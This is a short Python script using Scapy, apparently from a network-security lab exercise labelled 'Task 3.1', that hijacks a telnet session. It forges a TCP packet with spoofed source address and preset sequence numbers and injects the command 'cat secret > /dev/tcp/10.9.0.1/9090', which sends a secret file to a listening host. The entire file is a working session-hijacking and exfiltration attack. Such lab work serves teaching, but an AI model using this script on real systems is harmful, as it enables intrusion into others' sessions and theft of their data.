#!/usr/bin/env python3
# Task 3.1 --------------------Launching the attack manually--------------------------
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport= 54978, dport=23, flags="A", seq=1675816016, ack=79095183)
data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, iface="br-378971cbe991", verbose=0)